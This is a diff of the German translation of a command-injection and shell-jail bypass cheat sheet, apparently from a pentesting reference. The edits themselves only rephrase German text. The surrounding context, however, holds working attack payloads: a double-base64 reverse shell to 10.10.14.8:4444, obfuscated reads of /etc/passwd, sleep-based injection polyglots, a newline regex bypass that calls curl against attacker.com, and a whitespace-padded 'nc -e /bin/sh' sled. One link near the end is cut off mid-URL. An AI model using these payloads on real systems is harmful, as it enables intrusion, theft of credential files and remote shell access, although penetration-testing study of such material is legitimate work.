@@ -18,7 +18,7 @@ echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|
 #Then get the out of the rev shell executing inside of it:
 exec >&0
 ```
-### Umgehung von Pfaden und verbotenen Wörtern
+### Bypass-Pfade und verbotene Wörter
 ```bash
 # Question mark binary substitution
 /usr/bin/p?ng # /usr/bin/ping
@@ -110,7 +110,7 @@ uname!-1\-a # This equals to uname -a
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
 ```
-### Bypass-Pipes
+### Pipes umgehen
 ```bash
 bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
 ```
@@ -144,7 +144,7 @@ Sie könnten **burpcollab** oder [**pingb**](http://pingb.in) verwenden, zum Bei
 
 ### Builtins
 
-Falls Sie keine externen Funktionen ausführen können und nur Zugriff auf eine **begrenzte Menge an Builtins haben, um RCE zu erhalten**, gibt es einige nützliche Tricks, um dies zu tun. Normalerweise **werden Sie nicht in der Lage sein, alle** der **Builtins** zu verwenden, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Jail zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
+Falls Sie keine externen Funktionen ausführen können und nur Zugriff auf eine **begrenzte Menge an Builtins haben, um RCE zu erhalten**, gibt es einige nützliche Tricks, um dies zu tun. Normalerweise **werden Sie nicht alle** der **Builtins verwenden können**, daher sollten Sie **alle Ihre Optionen kennen**, um zu versuchen, das Jail zu umgehen. Idee von [**devploit**](https://twitter.com/devploit).\
 Zuerst überprüfen Sie alle [**Shell Builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Hier sind einige **Empfehlungen**:
 ```bash
 # Get list of builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Umgehung potenzieller Regexe
+### Umgehung potenzieller Regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -310,9 +310,9 @@ bypass-fs-protections-read-only-no-exec-distroless/
 
 ## Space-Based Bash NOP Sled ("Bashsledding")
 
-Wenn eine Schwachstelle es Ihnen ermöglicht, ein Argument teilweise zu kontrollieren, das letztendlich `system()` oder eine andere Shell erreicht, wissen Sie möglicherweise nicht den genauen Offset, an dem die Ausführung beginnt, Ihre Nutzlast zu lesen. Traditionelle NOP-Sleds (z. B. `\x90`) funktionieren in der Shell-Syntax **nicht**, aber Bash ignoriert harmlos führende Leerzeichen, bevor ein Befehl ausgeführt wird.
+Wenn eine Schwachstelle es Ihnen ermöglicht, ein Argument teilweise zu kontrollieren, das letztendlich `system()` oder eine andere Shell erreicht, wissen Sie möglicherweise nicht den genauen Offset, an dem die Ausführung beginnt, Ihre Payload zu lesen. Traditionelle NOP-Sleds (z. B. `\x90`) funktionieren in der Shell-Syntax **nicht**, aber Bash ignoriert harmlos führende Leerzeichen, bevor ein Befehl ausgeführt wird.
 
-Daher können Sie einen *NOP sled für Bash* erstellen, indem Sie Ihren echten Befehl mit einer langen Folge von Leerzeichen oder Tabulatorzeichen voranstellen:
+Daher können Sie ein *NOP sled für Bash* erstellen, indem Sie Ihren echten Befehl mit einer langen Folge von Leerzeichen oder Tabulatorzeichen voranstellen:
 ```bash
 # Payload sprayed into an environment variable / NVRAM entry
 "                nc -e /bin/sh 10.0.0.1 4444"
@@ -333,7 +333,7 @@ Praktische Anwendungsfälle:
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju)
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
 
 - [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
